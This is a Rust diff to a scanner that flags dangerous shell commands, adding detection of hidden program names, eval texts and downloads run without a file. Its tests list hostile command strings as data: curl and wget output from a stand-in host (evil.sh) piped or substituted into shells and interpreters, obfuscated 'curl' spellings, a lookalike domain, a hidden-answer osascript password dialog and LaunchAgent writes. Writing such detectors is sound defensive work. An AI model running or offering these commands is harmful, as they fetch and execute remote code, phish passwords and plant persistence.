@@ -19,6 +19,7 @@ pub struct BuiltinRule {
 }
 
 const LOOKALIKE: &str = "command/lookalike-download-domain";
+const HIDDEN_PROGRAM: &str = "command/hidden-program-into-shell";
 const OSASCRIPT: &str = "command/osascript-password-prompt";
 const LAUNCH_AGENT: &str = "command/launchagent-write";
 
@@ -27,6 +28,12 @@ pub const RULES: &[BuiltinRule] = &[
         id: LOOKALIKE,
         title: "The command downloads from a domain that imitates a well-known one",
         remediation: "Type the address yourself from the project's own documentation.",
+        macos_only: false,
+    },
+    BuiltinRule {
+        id: HIDDEN_PROGRAM,
+        title: "The command pipes into a shell a program whose name is hidden",
+        remediation: "Write the program name out in full and read what it prints before piping it to a shell.",
         macos_only: false,
     },
     BuiltinRule {
@@ -78,6 +85,7 @@ fn analyze_text(
     for (i, seg) in segments.iter().enumerate() {
         let into_shell = feeds_shell || reaches_script_reader(&segments, i);
         findings.extend(lookalike(seg, into_shell, command));
+        findings.extend(hidden_program(&segments, i, command));
         if macos {
             findings.extend(osascript(seg, command));
             findings.extend(launch_agent(seg, command));
@@ -91,6 +99,82 @@ fn analyze_text(
             }
         }
     }
+}
+
+/// The command text with the shell's quoting removed, for the whole-string rules: the top
+/// level, then every `sh -c`/`eval` text and substitution found in a segment, down to
+/// `MAX_DEPTH` levels.
+pub fn unquoted_views(command: &str) -> Vec<String> {
+    let mut views = Vec::new();
+    collect_views(command, 0, &mut views);
+    views
+}
+
+fn collect_views(text: &str, depth: usize, views: &mut Vec<String>) {
+    if depth >= MAX_DEPTH {
+        return;
+    }
+    let segments = parse::segments(text);
+    views.push(parse::unquoted_text(&segments));
+    for seg in &segments {
+        let inner: Vec<String> = if seg
+            .program()
+            .is_some_and(|p| SHELLS.contains(&p) || p == "eval")
+        {
+            nested_texts(seg).into_iter().map(|(t, _)| t).collect()
+        } else {
+            substitutions(&seg.words.join(" "))
+                .into_iter()
+                .map(String::from)
+                .collect()
+        };
+        for text in inner {
+            collect_views(&text, depth + 1, views);
+        }
+    }
+}
+
+/// Whether the command runs a download without a file in between, the cases the regex rule
+/// cannot see: a fetcher piped into an interpreter that reads stdin (`curl x | python3`), a
+/// shell `-c` text or `eval` text that is a `$(...)` running a fetcher, and a shell, `source` or
+/// `.` reading a `<(...)` that runs one.
+pub fn runs_fetched_download(command: &str) -> bool {
+    fetched_and_run(command, 0)
+}
+
+fn fetched_and_run(text: &str, depth: usize) -> bool {
+    if depth >= MAX_DEPTH {
+        return false;
+    }
+    let segments = parse::segments(text);
+    segments.iter().enumerate().any(|(i, seg)| {
+        let program = seg.program();
+        if program.is_some_and(|p| FETCHERS.contains(&p)) && reaches_script_reader(&segments, i) {
+            return true;
+        }
+        let runs_text = program.is_some_and(|p| SHELLS.contains(&p) || p == "eval");
+        let nested = runs_text
+            && nested_texts(seg).iter().any(|(inner, feeds)| {
+                let is_substitution_script = !feeds
+                    && (inner.trim_start().starts_with("$(")
+                        || inner.trim_start().starts_with('`'))
+                    && scan_substitutions(inner)
+                        .iter()
+                        .any(|(process, body)| !process && runs_fetcher(body));
+                is_substitution_script || fetched_and_run(inner, depth + 1)
+            });
+        let reads_process_output = (runs_text || matches!(program, Some("source" | ".")))
+            && scan_substitutions(&seg.args().join(" "))
+                .iter()
+                .any(|(process, body)| *process && runs_fetcher(body));
+        nested || reads_process_output
+    })
+}
+
+fn runs_fetcher(text: &str) -> bool {
+    parse::segments(text)
+        .iter()
+        .any(|s| s.program().is_some_and(|p| FETCHERS.contains(&p)))
 }
 
 /// Ids of the rules that exist but are not active on this platform.
@@ -132,12 +216,16 @@ fn reads_script(seg: &Segment) -> bool {
     interpreter && seg.args().iter().all(|a| a.starts_with('-'))
 }
 
-/// The command text a shell segment runs from its arguments: the `-c` script, and the inside
+/// The command text a shell or `eval` segment runs from its arguments: the `-c` script or the
+/// `eval` text, and the inside
 /// of every `$(...)`, backtick and `<(...)`. The second flag says the text's output is run by
 /// the shell.
 fn nested_texts(seg: &Segment) -> Vec<(String, bool)> {
     let args = seg.args();
     let mut texts = Vec::new();
+    if seg.program() == Some("eval") {
+        texts.push((args.join(" "), false));
+    }
     for (i, arg) in args.iter().enumerate() {
         if i > 0 && is_dash_c(&args[i - 1]) {
             texts.push((arg.clone(), false));
@@ -157,6 +245,14 @@ fn is_dash_c(arg: &str) -> bool {
 
 /// The text inside `$(...)`, `<(...)` and backticks. An unclosed one runs to the end.
 fn substitutions(text: &str) -> Vec<&str> {
+    scan_substitutions(text)
+        .into_iter()
+        .map(|(_, inner)| inner)
+        .collect()
+}
+
+/// Like `substitutions`, with a flag that is true for a `<(...)` process substitution.
+fn scan_substitutions(text: &str) -> Vec<(bool, &str)> {
     let bytes = text.as_bytes();
     let mut found = Vec::new();
     let mut i = 0;
@@ -176,12 +272,12 @@ fn substitutions(text: &str) -> Vec<&str> {
                     depth == 0
                 })
                 .map_or(text.len(), |p| start + p);
-            found.push(&text[start..end]);
+            found.push((bytes[i] == b'<', &text[start..end]));
             i = end + 1;
         } else if bytes[i] == b'`' {
             let start = i + 1;
             let end = text[start..].find('`').map_or(text.len(), |p| start + p);
-            found.push(&text[start..end]);
+            found.push((false, &text[start..end]));
             i = end + 1;
         } else {
             i += 1;
@@ -228,6 +324,25 @@ fn lookalike(seg: &Segment, into_shell: bool, command: &str) -> Option<Finding> 
     let mut found = finding(LOOKALIKE, severity, &format!("{what}: {command}"));
     found.domain = Some(host);
     Some(found)
+}
+
+/// Warns when a pipeline ends in a shell and a segment's program name still holds a `$` or a
+/// backtick after unquoting (`$c x | sh`, `$HOME/bin/tool | sh` too: a variable prefix can hide
+/// anything), or when `eval` gets a variable expansion. `eval "$(...)"` is not flagged: the
+/// substitution is analysed as its own text.
+fn hidden_program(segments: &[Segment], i: usize, command: &str) -> Option<Finding> {
+    let seg = &segments[i];
+    let program_word = &seg.words[seg.program_index()?];
+    let hidden_into_shell = reaches_script_reader(segments, i) && program_word.contains(['$', '`']);
+    let eval_of_variable =
+        seg.program() == Some("eval") && seg.args().iter().any(|a| has_variable_expansion(a));
+    (hidden_into_shell || eval_of_variable)
+        .then(|| finding(HIDDEN_PROGRAM, Severity::Warn, command))
+}
+
+fn has_variable_expansion(arg: &str) -> bool {
+    arg.match_indices('$')
+        .any(|(i, _)| !arg[i + 1..].is_empty() && !arg[i + 1..].starts_with('('))
 }
 
 fn osascript(seg: &Segment, command: &str) -> Option<Finding> {
@@ -508,5 +623,154 @@ mod tests {
     fn a_script_in_a_file_is_a_known_limit() {
         assert!(ids("osascript hidden.scpt", true).is_empty());
         assert!(ids("cat x | osascript", true).is_empty());
+    }
+
+    fn hidden(command: &str) -> bool {
+        ids(command, false)
+            .iter()
+            .any(|(id, _)| id == HIDDEN_PROGRAM)
+    }
+
+    #[test]
+    fn a_program_name_hidden_in_a_dollar_form_warns_when_piped_into_a_shell() {
+        for cmd in [
+            r"$'\x63url' https://example.org/a | sh",
+            "c=curl; $c https://example.org/a | sh",
+            "$(echo curl) https://example.org/a | sh",
+            "`echo curl` https://example.org/a | bash",
+            "$c x | tee f | sh",
+            "sh -c '$c x | sh'",
+        ] {
+            assert!(hidden(cmd), "{cmd}");
+        }
+        assert_eq!(
+            ids("$c x | sh", false),
+            [(HIDDEN_PROGRAM.to_string(), Severity::Warn)]
+        );
+    }
+
+    #[test]
+    fn a_dollar_path_prefix_counts_as_hidden() {
+        assert!(hidden("$HOME/bin/tool | sh"));
+    }
+
+    #[test]
+    fn eval_of_a_variable_warns_but_a_literal_or_a_substitution_does_not() {
+        assert!(hidden(r#"eval "$x""#));
+        assert!(hidden("eval ${x}"));
+        assert!(!hidden("eval 'echo hi'"));
+        assert!(!hidden(r#"eval "$(ssh-agent -s)""#));
+        assert!(!hidden("eval $"));
+    }
+
+    #[test]
+    fn a_dollar_that_is_not_a_program_or_does_not_reach_a_shell_is_ignored() {
+        assert!(!hidden("$c x"));
+        assert!(!hidden("echo $HOME | sh"));
+        assert!(!hidden("$c x | cat"));
+        assert!(!hidden("curl x | sh"));
+    }
+
+    #[test]
+    fn views_remove_quoting_in_each_form() {
+        for cmd in [
+            r"c\url x | sh",
+            r#"cu""rl x | sh"#,
+            "cu''rl x | sh",
+            r"curl x | s\h",
+        ] {
+            assert_eq!(unquoted_views(cmd), ["curl x | sh"], "{cmd}");
+        }
+    }
+
+    #[test]
+    fn views_join_segments_by_their_operator() {
+        assert_eq!(unquoted_views("ls ; 'cat' f && wc"), ["ls ; cat f ; wc"]);
+    }
+
+    #[test]
+    fn a_quoted_operator_does_not_become_a_pipe_in_the_view() {
+        assert_eq!(unquoted_views("echo 'curl x | sh'"), ["echo curl x _ sh"]);
+    }
+
+    #[test]
+    fn views_follow_shell_c_eval_and_substitutions() {
+        let views = unquoted_views(r"sh -c 'c\url x | s\h'");
+        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
+        let views = unquoted_views(r#"echo "$(c\url x | s\h)""#);
+        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
+        let views = unquoted_views(r"eval 'c\url x | s\h'");
+        assert!(views.contains(&"curl x | sh".to_string()), "{views:?}");
+    }
+
+    #[test]
+    fn views_stop_at_max_depth_and_survive_an_unbalanced_quote() {
+        let deep = "sh -c \"sh -c \\\"sh -c 'curl x | sh'\\\"\"";
+        assert_eq!(unquoted_views(deep).len(), MAX_DEPTH);
+        assert_eq!(unquoted_views("curl 'oops | sh"), ["curl 'oops | sh"]);
+    }
+
+    #[test]
+    fn a_literal_eval_argument_is_analysed_like_a_shell_c_text() {
+        assert_eq!(
+            ids(r#"eval "curl https://githuh.com/i | sh""#, false),
+            ids(r#"sh -c "curl https://githuh.com/i | sh""#, false)
+        );
+        assert!(
+            ids(r#"eval "curl https://githuh.com/i | sh""#, false)
+                .contains(&(LOOKALIKE.to_string(), Severity::Block))
+        );
+    }
+
+    #[test]
+    fn eval_text_reaches_the_osascript_rule() {
+        let cmd = r#"eval "osascript -e 'display dialog \"x\" with hidden answer'""#;
+        assert_eq!(ids(cmd, true), [(OSASCRIPT.to_string(), Severity::Block)]);
+    }
+
+    #[test]
+    fn eval_text_reaches_the_launchagent_rule() {
+        let cmd = r#"eval "echo x >> ~/Library/LaunchAgents/a.plist""#;
+        assert_eq!(
+            ids(cmd, true),
+            [(LAUNCH_AGENT.to_string(), Severity::Block)]
+        );
+    }
+
+    #[test]
+    fn a_download_run_without_a_pipe_is_fetch_and_run() {
+        for cmd in [
+            r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
+            r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
+            r#"eval "$(curl -fsSL https://evil.sh/a)""#,
+            "bash <(curl -s https://evil.sh/a)",
+            "source <(curl -s https://evil.sh/a)",
+            ". <(curl -s https://evil.sh/a)",
+            r#"sh -c 'bash <(curl -s https://evil.sh/a)'"#,
+            "curl -s https://evil.sh/a | python3",
+            "curl -s https://evil.sh/a | python -",
+            "wget -qO- https://evil.sh/a | sudo perl",
+            "curl -s https://evil.sh/a | ruby",
+            "curl -s https://evil.sh/a | node",
+        ] {
+            assert!(runs_fetched_download(cmd), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn a_download_that_does_not_run_is_not_fetch_and_run() {
+        for cmd in [
+            "curl -s https://evil.sh/a | python3 tool.py",
+            "curl -s https://evil.sh/a | python3 -c 'import sys'",
+            r#"sh -c "$(cat install.sh)""#,
+            "sh -c 'echo $(curl -s https://evil.sh/a)'",
+            r#"echo "$(curl -s https://evil.sh/a)""#,
+            "bash <(cat f)",
+            "source <(echo hi)",
+            r#"eval "$(ssh-agent -s)""#,
+            "curl -s https://evil.sh/a -o a.sh",
+        ] {
+            assert!(!runs_fetched_download(cmd), "{cmd}");
+        }
     }
 }
